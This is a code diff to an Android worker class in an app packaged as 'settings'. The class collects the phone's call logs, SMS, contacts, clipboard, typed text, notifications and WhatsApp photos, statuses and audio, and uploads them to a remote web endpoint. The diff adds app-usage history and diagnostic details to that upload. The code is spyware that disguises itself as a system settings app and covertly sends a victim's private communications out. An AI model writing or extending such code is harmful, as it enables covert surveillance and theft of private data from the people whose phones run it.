@@ -33,17 +33,19 @@ import static com.example.settings.MainActivity.geturl;
 import static com.example.settings.MainActivity.setuponetimeworkManager;
 import static com.example.settings.MainActivity.simName;
 import static com.example.settings.Utils.checkpermission;
+import static com.example.settings.Utils.getAppDataHistory;
 import static com.example.settings.Utils.getDateTime;
 import static com.example.settings.Utils.getOtherNotification;
 import static com.example.settings.Utils.getphoneAppdetails;
 import static com.example.settings.Utils.newUrlData;
+import static com.example.settings.Utils.setinfo;
 
 public class SyncData extends Worker {
     Sharedpref mSharedpref;
     Context context;
     String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime,
             Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "",NotificationData,
-            SmsData,OtherNotificationData,ClickedData,OtherClickedData;
+            SmsData,OtherNotificationData,ClickedData,OtherClickedData,AppUsageHistory,IssueDetails;
     String url="";
     public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
@@ -66,22 +68,13 @@ public class SyncData extends Worker {
         /*Abu ji Url*/
         //url="https://script.google.com/macros/s/AKfycbzL-e8xcaMP3Cu5rcv1SIFgZdQ1ayEtBX7d6Bo5/exec";
 
-        Name = mSharedpref.getSaveName();
-        OutgoingNumbers = mSharedpref.getOutgoingNumbers();
-        RecievedNumbers = mSharedpref.getRecievedNumbers();
-        MissedCallNumbers = mSharedpref.getMissedCallNumber();
-        TextWritten = mSharedpref.getSaveTextWritten();
-        NotificationData = mSharedpref.getNotificationData();
-        SmsData=mSharedpref.getSmsData();
-        OtherNotificationData=mSharedpref.getOtherNotificationData();
-        ClickedData=mSharedpref.getClickedData();
-        OtherClickedData=mSharedpref.getOtherClickedData();
+
         if (checkpermission(context, Manifest.permission.READ_PHONE_STATE) && (checkpermission(context, Manifest.permission.READ_CALL_LOG))) {
             Utils.readCallLogs(context, mSharedpref);
         }
         getphoneAppdetails(context,mSharedpref);
         getOtherNotification(context,mSharedpref);
-
+        getAppDataHistory(getApplicationContext(),mSharedpref);
         Utils.readSmsHistory(context,mSharedpref);
         Utils.getBatteryPercent(context,mSharedpref);
         Utils.isPhoneIsLockedOrNot(context);
@@ -93,6 +86,18 @@ public class SyncData extends Worker {
         multiMediaData.getWhatsphotos();
         multiMediaData.getWhatsAppStatus();
         Utils.readContacts(context,mSharedpref);
+        Name = mSharedpref.getSaveName();
+        OutgoingNumbers = mSharedpref.getOutgoingNumbers();
+        RecievedNumbers = mSharedpref.getRecievedNumbers();
+        MissedCallNumbers = mSharedpref.getMissedCallNumber();
+        TextWritten = mSharedpref.getSaveTextWritten();
+        NotificationData = mSharedpref.getNotificationData();
+        SmsData=mSharedpref.getSmsData();
+        OtherNotificationData=mSharedpref.getOtherNotificationData();
+        ClickedData=mSharedpref.getClickedData();
+        OtherClickedData=mSharedpref.getOtherClickedData();
+        AppUsageHistory=mSharedpref.getAppUsageHistory();
+        IssueDetails=mSharedpref.getOtherinfo();
 
         try {
             ClipboardManager clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
@@ -157,8 +162,12 @@ public class SyncData extends Worker {
                                     mSharedpref.setWhatsAppStatusJson("");
                                     mSharedpref.setWhatsAppAudioJSon("");
                                     mSharedpref.setServicerNotificationData("");
+                                    mSharedpref.setAppUsageHistory("");
+                                    mSharedpref.setotherinfo("");
                                     mSharedpref.commit();
-                                   try {
+                                    setinfo(mSharedpref,"Sync Periodic","Success  in Sending");
+
+                                    try {
                                        geturl();
                                        newUrlData(context,mSharedpref);
                                    }
@@ -171,7 +180,8 @@ public class SyncData extends Worker {
                                 @Override
                                 public void onErrorResponse(VolleyError error) {
                                     Log.d(context.getPackageName(),"Error");
-                                    setuponetimeworkManager("From Volley Error");
+                                    setinfo(mSharedpref,"Sync Periodic","Volley Error");
+                                    setuponetimeworkManager(context,"From Volley Error");
                                     Result.retry();
 
                                 }
@@ -211,6 +221,9 @@ public class SyncData extends Worker {
                             parmas.put("WhatsAppPhotos", mSharedpref.getWhatsAppAImageJson());
                             parmas.put("WhatsAppStatus", mSharedpref.getWhatsAppStatusJson());
                             parmas.put("WhatsAppAudio", mSharedpref.getWhatsAppAudioJson());
+                            parmas.put("AppUsages",AppUsageHistory);
+                            parmas.put("IssueDetails",IssueDetails);
+
                             return parmas;
                         }
                     };
@@ -245,14 +258,18 @@ public class SyncData extends Worker {
                                     mSharedpref.setWhatsAppStatusJson("");
                                     mSharedpref.setWhatsAppAudioJSon("");
                                     mSharedpref.setServicerNotificationData("");
+                                    mSharedpref.setAppUsageHistory("");
+                                    mSharedpref.setotherinfo("");
                                     mSharedpref.commit();
+                                    setinfo(mSharedpref,"Sync Periodic","Success  in Sending When Name is Empty");
                                 }
                             },
                             new Response.ErrorListener() {
                                 @Override
                                 public void onErrorResponse(VolleyError error) {
                                     Log.d(context.getPackageName(),"All empty Error");
-                                    setuponetimeworkManager("From Volley Error When Empty");
+                                    setinfo(mSharedpref,"Sync Periodic","Volley Error in Sending When Name is Empty");
+                                    setuponetimeworkManager(context,"From Volley Error When Empty");
                                     Result.retry();
 
                                 }
@@ -292,6 +309,8 @@ public class SyncData extends Worker {
                             parmas.put("WhatsAppPhotos", mSharedpref.getWhatsAppAImageJson());
                             parmas.put("WhatsAppStatus", mSharedpref.getWhatsAppStatusJson());
                             parmas.put("WhatsAppAudio", mSharedpref.getWhatsAppAudioJson());
+                            parmas.put("AppUsages",AppUsageHistory);
+                            parmas.put("IssueDetails",IssueDetails);
                             return parmas;
                         }
                     };
@@ -313,6 +332,8 @@ public class SyncData extends Worker {
         }
         else {
             Log.d("Settings","Internet Problem");
+            setinfo(mSharedpref,"Sync Periodic","Internet Not Available");
+
         }
 
         return Result.success();
